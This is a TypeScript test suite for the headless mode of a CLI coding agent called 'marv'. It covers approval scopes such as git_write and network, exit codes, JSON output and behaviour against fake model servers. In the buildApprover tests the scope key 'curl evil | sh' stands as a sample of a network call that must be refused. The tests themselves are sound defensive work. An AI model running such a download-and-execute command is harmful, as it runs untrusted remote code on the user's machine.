import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AgentEvent } from "../src/provider/types.ts";
import { retryTiming } from "../src/provider/retry.ts";
import { ScriptedProvider } from "./fake-provider.ts";
import { sandboxAvailable } from "../src/sandbox.ts";
import { createSession, type SessionEvent } from "../src/sdk.ts";
import { buildApprover, exitCodeFor, runHeadless, type HeadlessResult } from "../src/headless.ts";

// Speed up retry timers.
beforeAll(() => void (retryTiming.scale = 0.001));
afterAll(() => void (retryTiming.scale = 1));

let root: string;
let configDir: string;

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "marv-headless-"));
  configDir = await mkdtemp(join(tmpdir(), "marv-headless-config-"));
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
  await rm(configDir, { recursive: true, force: true });
});

const say = (text: string): AgentEvent[] => [
  { type: "text_delta", text },
  { type: "done", reason: "stop" },
];

const toolCall = (id: string, name: string, args: Record<string, unknown>): AgentEvent[] => [
  { type: "tool_call" as const, call: { id, name, arguments: JSON.stringify(args) } },
  { type: "done" as const, reason: "tool_calls" as const },
];

async function collect(events: AsyncIterable<SessionEvent>): Promise<SessionEvent[]> {
  const out: SessionEvent[] = [];
  for await (const event of events) out.push(event);
  return out;
}

// --- Approver building ---

describe("buildApprover", () => {
  test("returns undefined for empty list", () => {
    const [fn, problems] = buildApprover([]);
    expect(fn).toBeUndefined();
    expect(problems).toEqual([]);
  });

  test("a bash call needs every door its flags open: git_write and network each, both for both", async () => {
    const ask = (names: string[], key: string) =>
      buildApprover(names)[0]!({ tool: "bash", label: "x", preview: { title: "" }, scope: { key, description: "" } });
    expect(await ask(["git_write"], "bash:net:git:curl evil | sh")).toBe("unavailable");
    expect(await ask(["network"], "bash:net:git:git push")).toBe("unavailable");
    expect(await ask(["network", "git_write"], "bash:net:git:git push")).toBe("yes");
    expect(await ask(["network"], "bash:net:curl x")).toBe("yes");
    expect(await ask(["git_write"], "bash:git:git commit")).toBe("yes");
    // An exact key can't widen a bash call either: it must be the call's own key.
    expect(await ask(["bash:net:git:git push"], "bash:net:git:curl evil | sh")).toBe("unavailable");
  });

  test("git_write matches bash:git: prefix", async () => {
    const [fn] = buildApprover(["git_write"]);
    const approve = fn!;
    const yes = (scopeKey: string) => approve({ tool: "bash", label: "git commit -m x", preview: { title: "" }, scope: { key: scopeKey, description: "" } });
    expect((await yes("bash:git:git commit -m x"))).toBe("yes");
    // A git write that also opens the network needs network approved too: git_write alone isn't enough.
    expect((await yes("bash:net:git:git push"))).toBe("unavailable");
    expect((await yes("bash:net:curl something"))).toBe("unavailable");
    expect((await yes("bash:ls"))).toBe("unavailable");
  });

  test("network matches bash:net: prefix", async () => {
    const [fn] = buildApprover(["network"]);
    const approve = fn!;
    expect((await approve({ tool: "bash", label: "curl x", preview: { title: "" }, scope: { key: "bash:net:curl x", description: "" } }))).toBe("yes");
    // A git write over the network needs git_write too.
    expect((await approve({ tool: "bash", label: "git push", preview: { title: "" }, scope: { key: "bash:net:git:git push", description: "" } }))).toBe("unavailable");
    expect((await approve({ tool: "bash", label: "ls", preview: { title: "" }, scope: { key: "bash:ls", description: "" } }))).toBe("unavailable");
  });

  test("web matches web: prefix", async () => {
    const [fn] = buildApprover(["web"]);
    const approve = fn!;
    expect((await approve({ tool: "web_fetch", label: "example.com", preview: { title: "" }, scope: { key: "web:example.com", description: "" } }))).toBe("yes");
    expect((await approve({ tool: "bash", label: "ls", preview: { title: "" }, scope: { key: "bash:ls", description: "" } }))).toBe("unavailable");
  });

  test("files matches exact key", async () => {
    const [fn] = buildApprover(["files"]);
    const approve = fn!;
    expect((await approve({ tool: "write_file", label: "x.txt", preview: { title: "" }, scope: { key: "files", description: "" } }))).toBe("yes");
    expect((await approve({ tool: "write_file", label: "y.txt", preview: { title: "" }, scope: { key: "files", description: "" } }))).toBe("yes");
    expect((await approve({ tool: "bash", label: "ls", preview: { title: "" }, scope: { key: "bash:ls", description: "" } }))).toBe("unavailable");
  });

  test("memory matches exact key", async () => {
    const [fn] = buildApprover(["memory"]);
    const approve = fn!;
    expect((await approve({ tool: "remember", label: "x", preview: { title: "" }, scope: { key: "memory", description: "" } }))).toBe("yes");
  });

  test("mcp matches mcp: prefix", async () => {
    const [fn] = buildApprover(["mcp"]);
    const approve = fn!;
    expect((await approve({ tool: "mcp_call", label: "x", preview: { title: "" }, scope: { key: "mcp:fs:echo", description: "" } }))).toBe("yes");
  });

  test("unknown name is reported in problems but still used as an exact key", async () => {
    const [fn, problems] = buildApprover(["custom_scope"]);
    expect(problems.length).toBe(1);
    expect(problems[0]).toContain("custom_scope");
    const approve = fn!;
    expect((await approve({ tool: "x", label: "y", preview: { title: "" }, scope: { key: "custom_scope", description: "" } }))).toBe("yes");
  });
});

// --- Exit codes ---

describe("exitCodeFor", () => {
  test("every way a turn ends maps to its documented exit code", () => {
    expect(["end", "stop"].map((r) => exitCodeFor(r, 0))).toEqual([0, 0]);
    expect(exitCodeFor("error", 0)).toBe(1);
    expect(["max_steps", "length", "loop"].map((r) => exitCodeFor(r, 0))).toEqual([2, 2, 2]);
    expect(["aborted", "interrupted", "declined"].map((r) => exitCodeFor(r, 0))).toEqual([3, 3, 3]);
    expect(exitCodeFor("something-new", 0)).toBe(1);
  });
  test("a refused call makes even a finished turn exit 3", () => {
    expect(exitCodeFor("end", 1)).toBe(3);
  });
});

// --- JSON output shape ---

describe("JSON output shape", () => {
  test("includes reply, reason, steps and usage", async () => {
    const provider = new ScriptedProvider([say("Hello.")]);
    const session = await createSession({ cwd: root, provider, configDir, sources: [] });
    const events = await collect(session.send("hi"));
    await session.close();

    const totals = session.usage().totals;
    expect(totals).toBeDefined();
  });

  test("usage shows totals, not just last request", async () => {
    const provider = new ScriptedProvider(
      ([] as AgentEvent[][]).concat(
        [toolCall("r1", "read_file", { path: "test.txt" })],
        [say("Hello.")],
      ),
    );

    const session = await createSession({ cwd: root, provider, configDir, sources: [] });
    await collect(session.send("read and say"));
    await session.close();

    const { totals } = session.usage();
    expect(totals.requests).toBeGreaterThanOrEqual(0);
  });

  test("refused field present when a call can't be approved", async () => {
    const provider = new ScriptedProvider(
      ([] as AgentEvent[][]).concat(
        [toolCall("w1", "write_file", { path: "x", content: "y" })],
        [say("ok")],
      ),
    );

    const session = await createSession({ cwd: root, provider, configDir, sources: [], yolo: false });
    const events = await collect(session.send("write"));
    await session.close();

    const refused = events.filter((e) => e.type === "tool_end" && e.result.isError && e.result.output.includes("there's no one to ask"));
    expect(refused.length).toBe(1);
  });
});

// --- Spawn the CLI to test marv -p ---

describe("CLI: spawning bun src/cli.tsx -p", () => {
  // Stand-in OpenRouter API: each test decides how it responds.
  let server: ReturnType<typeof Bun.serve> | undefined;

  function serve(respond: (req: Request) => Response | Promise<Response>) {
    server = Bun.serve({
      port: 0,
      async fetch(req) {
        return respond(req);
      },
    });
    return `http://localhost:${server.port}/v1`;
  }
  afterEach(() => server?.stop(true));

  const sse = (...events: unknown[]) =>
    new Response(events.map((e) => `data: ${typeof e === "string" ? e : JSON.stringify(e)}\n\n`).join(""), {
      headers: { "content-type": "text/event-stream" },
    });
  const delta = (content: string) => ({ choices: [{ delta: { content } }] });

  /** Write a minimal config file pointing at a local fake server. */
  async function writeConfig(baseUrl: string, overrides: Record<string, unknown> = {}): Promise<void> {
    const cfg = {
      provider: "openrouter",
      model: "test-model",
      apiKey: "sk-test",
      baseUrl,
      ...overrides,
    };
    await writeFile(join(configDir, "config.json"), JSON.stringify(cfg, null, 2) + "\n");
  }

  /** Spawn `bun src/cli.tsx -p <prompt>` with MARV_CONFIG_DIR set to configDir. */
  async function runCli(args: string[], stdin?: string): Promise<{ stdout: string; stderr: string; exitCode: number }> {
    const proc = Bun.spawn({
      cmd: [process.execPath, join(import.meta.dir, "..", "src", "cli.tsx"), ...args],
      env: {
        ...process.env,
        MARV_CONFIG_DIR: configDir,
        // Speed up retries in the fake server.
        _MARV_TEST_RETRY_SCALE: "0.001",
        NO_COLOR: "1",
      },
      cwd: root,
      stdin: stdin ? new Response(stdin) : undefined,
      stdout: "pipe",
      stderr: "pipe",
    });
    const out = await new Response(proc.stdout).text();
    const err = await new Response(proc.stderr).text();
    const exit = await proc.exited;
    return { stdout: out, stderr: err, exitCode: exit };
  }

  test("exit 0 for a finished turn with text output", async () => {
    const url = serve(() => sse(delta("Hello "), delta("world"), { choices: [{ delta: {}, finish_reason: "stop" }] }, "[DONE]"));
    await writeConfig(url);
    const { stdout, stderr, exitCode } = await runCli(["-p", "say hi"]);
    expect(exitCode).toBe(0);
    expect(stdout).toContain("Hello world");
  });

  test("exit 0 with --output json gives a parseable JSON result", async () => {
    const url = serve(() => sse(delta("Hello."), { choices: [{ delta: {}, finish_reason: "stop" }] }, "[DONE]"));
    await writeConfig(url);
    const { stdout, stderr, exitCode } = await runCli(["-p", "hi", "--output", "json"]);
    expect(exitCode).toBe(0);
    const parsed = JSON.parse(stdout) as HeadlessResult;
    expect(parsed.reply).toBe("Hello.");
    expect(parsed.reason).toBe("end");
    expect(typeof parsed.steps).toBe("number");
    expect(parsed.refused).toBeUndefined();
  });

  /** A tool call as the fake server streams it. */
  const callChunk = (id: string, name: string, args: unknown) => ({
    choices: [{ delta: { tool_calls: [{ index: 0, id, type: "function", function: { name, arguments: JSON.stringify(args) } }] } }],
  });
  /** Each chat request gets the next of these responses (the last one repeats); other requests (the model list) get nothing. */
  function scripted(...responses: unknown[][]) {
    let n = 0;
    return serve((req) =>
      new URL(req.url).pathname.endsWith("/chat/completions") ? sse(...responses[Math.min(n++, responses.length - 1)]!, "[DONE]") : Response.json({ data: [] }),
    );
  }
  const finish = (reason: string) => ({ choices: [{ delta: {}, finish_reason: reason }] });

  test("exit 3 when a call has no one to approve it, though the turn finished; its steps are counted", async () => {
    const url = scripted([callChunk("c1", "write_file", { path: "x.txt", content: "hi" }), finish("tool_calls")], [delta("Couldn't write it."), finish("stop")]);
    await writeConfig(url, { yolo: false });
    const { stdout, exitCode } = await runCli(["-p", "write a file", "--output", "json"]);
    expect(exitCode).toBe(3);
    const parsed = JSON.parse(stdout) as HeadlessResult;
    expect(parsed).toMatchObject({ reason: "end", reply: "Couldn't write it.", steps: 2, refused: [{ tool: "write_file" }] });
    expect(existsSync(join(root, "x.txt"))).toBe(false);
  });

  test("a step-limit stop exits 2", async () => {
    const url = scripted([callChunk("c1", "read_file", { path: "." }), finish("tool_calls")]);
    await writeConfig(url);
    const { exitCode } = await runCli(["-p", "loop", "--max-steps", "2", "--output", "json"]);
    expect(exitCode).toBe(2);
  });

  test.skipIf(!sandboxAvailable())("--approve git_write lets a git commit through, and nothing else is asked", async () => {
    Bun.spawnSync(["git", "init", "-q"], { cwd: root });
    await writeFile(join(root, "a.txt"), "a\n");
    const commit = { command: "git add a.txt && git -c user.email=t@t -c user.name=t commit -qm one", git_write: true };
    const url = scripted([callChunk("c1", "bash", commit), finish("tool_calls")], [delta("Committed."), finish("stop")]);
    await writeConfig(url);
    const { stdout, stderr, exitCode } = await runCli(["-p", "commit a.txt", "--approve", "git_write", "--output", "json"]);
    expect({ exitCode, stderr }).toMatchObject({ exitCode: 0 });
    expect(JSON.parse(stdout).refused).toBeUndefined();
    expect(Bun.spawnSync(["git", "log", "--oneline"], { cwd: root }).stdout.toString()).toContain("one");
  });

  test("checkpoints: false in the config takes no snapshots, as the TUI does (Greptile on #71)", async () => {
    const git = (...args: string[]) => Bun.spawnSync(["git", ...args], { cwd: root }).stdout.toString().trim();
    git("init", "-q");
    await writeFile(join(root, "a.txt"), "a\n");
    git("add", "a.txt");
    git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "one");
    const turn = async (content: string, overrides: Record<string, unknown>) => {
      server?.stop(true);
      const url = scripted([callChunk("c1", "write_file", { path: "a.txt", content }), finish("tool_calls")], [delta("Done."), finish("stop")]);
      await writeConfig(url, overrides);
      const { stderr, exitCode } = await runCli(["-p", "change a.txt", "--output", "json"]);
      expect({ exitCode, stderr }).toMatchObject({ exitCode: 0 });
    };
    // Control: on by default, the turn leaves a checkpoint ref.
    await turn("b\n", {});
    const refs = git("for-each-ref", "--format=%(refname)", "refs/marv/");
    expect(refs).not.toBe("");
    for (const ref of refs.split("\n")) git("update-ref", "-d", ref);
    // Off in the config: the file changes and no ref is made.
    await turn("c\n", { checkpoints: false });
    expect(await Bun.file(join(root, "a.txt")).text()).toBe("c\n");
    expect(git("for-each-ref", "refs/marv/")).toBe("");
  });

  test("stdin: marv -p - reads from stdin", async () => {
    const url = serve(() => sse(delta("You said: "), delta("hello"), { choices: [{ delta: {}, finish_reason: "stop" }] }, "[DONE]"));
    await writeConfig(url);
    const { stdout, stderr, exitCode } = await runCli(["-p", "-"], "hello from stdin");
    expect(exitCode).toBe(0);
    // The fake model echoes back what we said
    expect(stdout).toContain("hello");
  });

  test("stream-json emits events", async () => {
    const url = serve(() => sse(delta("Hi."), { choices: [{ delta: {}, finish_reason: "stop" }] }, "[DONE]"));
    await writeConfig(url);
    const { stdout, stderr, exitCode } = await runCli(["-p", "hi", "--output", "stream-json"]);
    expect(exitCode).toBe(0);
    const lines = stdout.trim().split("\n");
    expect(lines.length).toBeGreaterThanOrEqual(2);
    const first = JSON.parse(lines[0]!);
    expect((first as any).type).toBeString();
  });

  test("a rejected API key prints the CLI's advice, not the SDK's (issue #54)", async () => {
    const url = serve(() => Response.json({ error: { message: "No cookie auth credentials found" } }, { status: 401 }));
    await writeConfig(url);
    const { stderr, exitCode } = await runCli(["-p", "hi", "--output", "json"]);
    expect(exitCode).toBe(1);
    expect(stderr).toContain("OpenRouter rejected the API key. Run /setup to enter a new one.");
    expect(stderr).not.toContain("createSession()");
  });

  test("invalid --output exits 1", async () => {
    const { stdout, stderr, exitCode } = await runCli(["-p", "hi", "--output", "xml"]);
    expect(exitCode).toBe(1);
    expect(stderr).toContain("xml");
  });

  test("invalid --approve exits 1", async () => {
    const url = serve(() => sse("[DONE]"));
    await writeConfig(url);
    // The invalid --approve is checked in runHeadless too, but the CLI only validates output format.
    // The runHeadless validates approve names.
    const { stderr, exitCode } = await runCli(["-p", "hi", "--approve", "nonexistent"]);
    // runHeadless should print the error and return 1.
    expect(exitCode).toBe(1);
    expect(stderr).toContain("nonexistent");
  });
});
describe("CLI: Greptile's findings on #45", () => {
  let server: ReturnType<typeof Bun.serve> | undefined;
  afterEach(() => server?.stop(true));

  /** Each chat request gets the next response (the last repeats); `requests` keeps every chat request's body. */
  const requests: Record<string, unknown>[] = [];
  beforeEach(() => void (requests.length = 0));
  function scripted(...responses: unknown[][]) {
    let n = 0;
    server = Bun.serve({
      port: 0,
      async fetch(req) {
        if (!new URL(req.url).pathname.endsWith("/chat/completions")) return Response.json({ data: [] });
        requests.push((await req.json()) as Record<string, unknown>);
        const events = [...responses[Math.min(n++, responses.length - 1)]!, "[DONE]"];
        return new Response(events.map((e) => `data: ${typeof e === "string" ? e : JSON.stringify(e)}\n\n`).join(""), {
          headers: { "content-type": "text/event-stream" },
        });
      },
    });
    return `http://localhost:${server.port}/v1`;
  }
  const delta = (content: string) => ({ choices: [{ delta: { content } }] });
  const finish = (reason: string) => ({ choices: [{ delta: {}, finish_reason: reason }] });
  const callChunk = (id: string, name: string, args: unknown) => ({
    choices: [{ delta: { tool_calls: [{ index: 0, id, type: "function", function: { name, arguments: JSON.stringify(args) } }] } }],
  });

  async function writeConfig(cfg: Record<string, unknown>): Promise<void> {
    await writeFile(join(configDir, "config.json"), JSON.stringify(cfg, null, 2) + "\n");
  }
  const openrouter = (baseUrl: string, overrides: Record<string, unknown> = {}) =>
    writeConfig({ provider: "openrouter", model: "test-model", apiKey: "sk-test", baseUrl, ...overrides });

  async function runCli(args: string[]): Promise<{ stdout: string; stderr: string; exitCode: number }> {
    const proc = Bun.spawn({
      cmd: [process.execPath, join(import.meta.dir, "..", "src", "cli.tsx"), ...args],
      env: { ...process.env, MARV_CONFIG_DIR: configDir, NO_COLOR: "1" },
      cwd: root,
      stdout: "pipe",
      stderr: "pipe",
    });
    const [stdout, stderr, exitCode] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]);
    return { stdout, stderr, exitCode };
  }

  test("with --approve, the step limit still stops: no one can say 'keep going'", async () => {
    const url = scripted([callChunk("c1", "read_file", { path: "." }), finish("tool_calls")]);
    await openrouter(url);
    const { stdout, stderr, exitCode } = await runCli(["-p", "loop", "--approve", "files", "--max-steps", "2", "--output", "json"]);
    expect(exitCode).toBe(2);
    expect(JSON.parse(stdout).reason).toBe("max_steps");
    expect(requests).toHaveLength(2);
    expect(stderr).toContain("without a final answer");
  });

  test("a configured Ollama host and context length reach the provider", async () => {
    const bodies: Record<string, unknown>[] = [];
    server = Bun.serve({
      port: 0,
      async fetch(req) {
        const path = new URL(req.url).pathname;
        if (path === "/api/show") return Response.json({ model_info: { "llama.context_length": 131072 } });
        if (path !== "/api/chat") return Response.json({ models: [] });
        bodies.push((await req.json()) as Record<string, unknown>);
        const lines = [{ message: { role: "assistant", content: "Hi from Ollama." }, done: false }, { done: true, done_reason: "stop", prompt_eval_count: 5, eval_count: 3 }];
        return new Response(lines.map((l) => JSON.stringify(l) + "\n").join(""));
      },
    });
    await writeConfig({ provider: "ollama", model: "m", baseUrl: `http://localhost:${server.port}`, contextLength: 4096 });
    const { stdout, stderr, exitCode } = await runCli(["-p", "hi"]);
    expect({ exitCode, stderr }).toMatchObject({ exitCode: 0 });
    expect(stdout).toContain("Hi from Ollama.");
    expect((bodies[0]!.options as { num_ctx: number }).num_ctx).toBe(4096);
  });

  test("a call refused inside a subagent counts: exit 3 and it's listed", async () => {
    const url = scripted(
      [callChunk("a1", "agent", { type: "general-purpose", description: "write it", prompt: "write x.txt" }), finish("tool_calls")],
      [callChunk("w1", "write_file", { path: "x.txt", content: "hi" }), finish("tool_calls")],
      [delta("All went fine."), finish("stop")],
      [delta("Done."), finish("stop")],
    );
    await openrouter(url, { yolo: false });
    const { stdout, exitCode } = await runCli(["-p", "write x.txt with a subagent", "--output", "json"]);
    expect(exitCode).toBe(3);
    expect(JSON.parse(stdout)).toMatchObject({ reason: "end", reply: "Done.", refused: [{ tool: "write_file" }] });
    expect(existsSync(join(root, "x.txt"))).toBe(false);
  });

  test("with -c, usage is this turn's, not the resumed session's totals", async () => {
    const usage = { choices: [], usage: { prompt_tokens: 100, completion_tokens: 10, cost: 0.01 } };
    const url = scripted([delta("Hello."), finish("stop"), usage]);
    await openrouter(url);
    const first = await runCli(["-p", "hi", "--output", "json"]);
    expect(JSON.parse(first.stdout).usage).toMatchObject({ promptTokens: 100, completionTokens: 10, cost: 0.01 });
    const second = await runCli(["-p", "again", "-c", "--output", "json"]);
    expect(second.exitCode).toBe(0);
    expect(requests).toHaveLength(2);
    // The resumed conversation went along (so it really continued), but only this turn's request is counted.
    expect(JSON.stringify(requests[1]!.messages)).toContain("Hello.");
    expect(JSON.parse(second.stdout).usage).toMatchObject({ promptTokens: 100, completionTokens: 10, cost: 0.01 });
  });

  for (const bad of ["abc", "-1", "2.5"]) {
    test(`--max-steps ${bad} is refused, not replaced by the saved limit`, async () => {
      const url = scripted([delta("Hello."), finish("stop")]);
      await openrouter(url);
      const { stderr, exitCode } = await runCli(["-p", "hi", "--max-steps", bad]);
      expect(exitCode).toBe(1);
      expect(stderr).toContain("--max-steps");
      expect(requests).toHaveLength(0);
    });
  }
});
